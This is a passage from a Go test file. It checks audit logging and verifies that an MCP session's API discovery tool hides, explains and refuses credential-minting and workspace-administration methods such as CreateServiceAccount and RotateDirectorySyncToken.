		a.Equal(v1pb.AuditLog_WARNING.String(), matched[0]["severity"])
		a.InDelta(float64(connect.CodePermissionDenied), matched[0]["status_code"], 0)
	}
}

// captureAuditStream sends slog.Default to a buffer until the test ends and
// returns a reader for the audit lines written so far. The servers these tests
// boot run in this process, so their stream lands there too. slog.Default is
// process-wide, so a test that calls this must not be parallel, and must call
// it before starting its server so the server stops before the logger is
// restored.
func captureAuditStream(t *testing.T) func() []map[string]any {
	t.Helper()
	var mu sync.Mutex
	var buf bytes.Buffer
	prev, prevWriter, prevFlags := slog.Default(), log.Writer(), log.Flags()
	// slog.SetDefault also points the log package at the new handler, and
	// restoring the slog default does not undo that.
	t.Cleanup(func() {
		slog.SetDefault(prev)
		log.SetOutput(prevWriter)
		log.SetFlags(prevFlags)
	})
	slog.SetDefault(slog.New(slog.NewJSONHandler(lockedBuffer{mu: &mu, buf: &buf}, nil)))
	return func() []map[string]any {
		mu.Lock()
		defer mu.Unlock()
		var lines []map[string]any
		for _, raw := range bytes.Split(buf.Bytes(), []byte("\n")) {
			var line map[string]any
			if json.Unmarshal(raw, &line) == nil && line["log_type"] == "audit" {
				lines = append(lines, line)
			}
		}
		return lines
	}
}

// lineFlag reads one boolean attribute off a captured audit line, absent
// meaning false.
func lineFlag(line map[string]any, key string) bool {
	v, ok := line[key].(bool)
	return ok && v
}

type lockedBuffer struct {
	mu  *sync.Mutex
	buf *bytes.Buffer
}

func (l lockedBuffer) Write(p []byte) (int, error) {
	l.mu.Lock()
	defer l.mu.Unlock()
	return l.buf.Write(p)
}

// TestMCPCredentialMintsLeaveDiscovery pins the other half of the
// classification: an agent must not be OFFERED work it can never do, but a call
// that arrives anyway — from memory, or from a skill written before the
// annotation — must still meet the gate's actionable denial rather than
// "unknown operation".
//
// This runs over a live session rather than over the index directly, because
// what matters is what the agent's own tools return.
func TestMCPCredentialMintsLeaveDiscovery(t *testing.T) {
	t.Parallel()
	a := require.New(t)
	ctx := context.Background()
	ctl, ctx := startWorkspace(ctx, t)

	workspace, err := ctl.workspaceServiceClient.GetWorkspace(ctx, connect.NewRequest(&v1pb.GetWorkspaceRequest{
		Name: "workspaces/-",
	}))
	a.NoError(err)
	workspaceName := workspace.Msg.Name

	session := openMCPSession(ctx, t, ctl, ctl.authInterceptor.token)
	defer session.Close()

	// Browsing a service never offers a method the session can never call: the
	// method is not in the served listing and its schema is never shown. It is
	// named under "Not available over MCP" with the gate's reason, so the agent
	// can send the user to the console instead of guessing.
	//
	// The positive control comes first and on the same tool: without one,
	// NotContains over an opaque text blob passes for the wrong reason as soon
	// as search_api returns anything that is not an endpoint listing — an
	// error string, an empty result — and a test that cannot fail is worse
	// here than no test.
	servedListing := searchAPIOnSession(ctx, t, session, map[string]any{"service": "DatabaseService"})
	a.Contains(servedListing, "DatabaseService/ListDatabases",
		"positive control: a service the ceiling serves must really come back as an endpoint listing")

	// These services host the credential mints, and since the ceiling gate
	// refuses EXCLUDED as well as FORBIDDEN, every one of their methods is now
	// refused — the mints outright, their read siblings as workspace
	// administration. So they come back as unavailable, with no listing.
	for _, row := range []struct {
		service string
		refused []string
	}{
		{"ServiceAccountService", []string{"CreateServiceAccount", "UpdateServiceAccount", "GetServiceAccount"}},
		{"IdentityProviderService", []string{"CreateIdentityProvider", "UpdateIdentityProvider", "TestIdentityProvider"}},
	} {
		listing := searchAPIOnSession(ctx, t, session, map[string]any{"service": row.service})
		a.Contains(listing, row.service+" is not available over MCP",
			"%s serves no method under any ceiling, so it is not a menu", row.service)
		a.NotContains(listing, "Found ", "%s offers no endpoint", row.service)
		for _, method := range row.refused {
			a.Contains(listing, row.service+"/"+method,
				"search_api names %s/%s as unavailable", row.service, method)
		}
	}

	// servedAndUnavailable splits a mixed service's listing at the section that
	// names what MCP cannot do.
	servedAndUnavailable := func(service string) (string, string) {
		listing := searchAPIOnSession(ctx, t, session, map[string]any{"service": service})
		served, unavailable, ok := strings.Cut(listing, "## Not available over MCP")
		a.True(ok, "%s names what MCP cannot do", service)
		return served, unavailable
	}

	// WorkspaceService is the mixed case and the one that proves the hiding is
	// per method rather than per service: it keeps GetWorkspace and
	// ListWorkspaces, so it stays on the menu, and the token rotation is only
	// named as unavailable.
	served, unavailable := servedAndUnavailable("WorkspaceService")
	a.Contains(served, "WorkspaceService/ListWorkspaces", "a service keeps the methods the ceiling serves")
	a.NotContains(served, "WorkspaceService/RotateDirectorySyncToken",
		"search_api must not offer the token rotation, which the session can never call")
	a.Contains(unavailable, "WorkspaceService/RotateDirectorySyncToken")

	// UserService is the second mixed case, and it moved here when
	// GetCurrentUser stopped returning the MFA enrollment secrets. Reading who
	// you are is the one thing an agent does on this service; creating a user,
	// redirecting an account's email and reading somebody else's profile stay
	// refused, and stay off the menu.
	served, unavailable = servedAndUnavailable("UserService")
	a.Contains(served, "UserService/GetCurrentUser",
		"the session reads its own identity, so the service is a menu with that on it")
	for _, method := range []string{"CreateUser", "UpdateEmail", "GetUser", "ListUsers"} {
		a.NotContains(served, "UserService/"+method,
			"search_api must not offer UserService/%s, which the session can never call", method)
		a.Contains(unavailable, "UserService/"+method)
	}

	// SettingService hosts TestEmailSetting, a mint. It keeps GetSetting, which
	// the gate serves for the governance settings alone, and UpdateSetting,
	// which it serves only through administer_workspace.
	served, unavailable = servedAndUnavailable("SettingService")
	a.Contains(served, "SettingService/GetSetting", "the session reads the governance settings")
	a.Contains(served, "SettingService/UpdateSetting", "the session changes the approval rules")
	a.Contains(served, "through the administer_workspace tool", "the listing names the one way to change a setting")
	for _, method := range []string{"TestEmailSetting", "ListSettings"} {
		a.NotContains(served, "SettingService/"+method,
			"search_api must not offer SettingService/%s, which the session can never call", method)
		a.Contains(unavailable, "SettingService/"+method)
	}

	served, unavailable = servedAndUnavailable("WorkloadIdentityService")
	for _, method := range []string{"GetWorkloadIdentity", "ListWorkloadIdentities", "CreateWorkloadIdentity"} {
		a.Contains(served, "WorkloadIdentityService/"+method, "the session reads identities and creates one through the tool")
	}
	a.Contains(served, "through the administer_workspace tool", "the listing names the one way to create an identity")
	for _, method := range []string{"UpdateWorkloadIdentity", "DeleteWorkloadIdentity"} {
		a.NotContains(served, "WorkloadIdentityService/"+method,
			"search_api must not offer WorkloadIdentityService/%s, which the session can never call", method)
		a.Contains(unavailable, "WorkloadIdentityService/"+method)
	}

	// The service list is the entry point into discovery, and a service whose
	// every method is refused leaves the menu for the list of what MCP cannot do.
	services := searchAPIOnSession(ctx, t, session, map[string]any{})
	available, unavailableServices, ok := strings.Cut(services, "## Not available over MCP")
	a.True(ok, "the service list names what MCP cannot do")
	for _, service := range []string{
		"ServiceAccountService", "IdentityProviderService",
	} {
		a.NotContains(available, service, "%s serves nothing, so it is not on the menu", service)
		a.Contains(unavailableServices, "**"+service+"**", "%s is named as unavailable", service)
	}
	a.Contains(available, "DatabaseService", "positive control: services the ceiling serves stay listed")
	a.Contains(available, "WorkspaceService", "a service keeping any served method stays listed")
	a.Contains(available, "UserService", "and so does the one that kept only GetCurrentUser")
	a.Contains(available, "SettingService", "and the one that kept only GetSetting")
	a.Contains(available, "WorkloadIdentityService", "and the one that kept its reads and the create")

	// Still resolvable by operation ID, and a call still reaches the gate.
	for _, operation := range []string{
		"ServiceAccountService/CreateServiceAccount",
		"ServiceAccountService/UpdateServiceAccount",
		"WorkspaceService/RotateDirectorySyncToken",
		"UserService/CreateUser",
		"IdentityProviderService/CreateIdentityProvider",
		"IdentityProviderService/UpdateIdentityProvider",
		"IdentityProviderService/TestIdentityProvider",
		"WorkloadIdentityService/UpdateWorkloadIdentity",
		"SettingService/TestEmailSetting",
		"UserService/UpdateEmail",
	} {
		detail := searchAPIOnSession(ctx, t, session, map[string]any{"operationId": operation})
		a.Contains(detail, "Not available over MCP", "%s says why instead of showing a schema", operation)
		a.NotContains(detail, "Unknown operationId",
			"%s must stay resolvable so the denial can explain itself", operation)
	}

	// The reads of those services are still not FORBIDDEN — they carry no
	// credential, and TestForbiddenClassLeavesReadsAlone pins that they never
	// become so. They are EXCLUDED, which is a scope decision a later
	// admin-capable ceiling can revisit, and until then they are refused and
	// unadvertised like everything else no mode serves.
	saRead := callAPIOnSession(ctx, t, session, "ServiceAccountService/ListServiceAccounts", map[string]any{
		"parent": workspaceName,
	})
	a.Equal(http.StatusForbidden, saRead.Status)
	a.Contains(saRead.Error, "administers the workspace",
		"the read is refused for what it is, not for minting a credential")
}
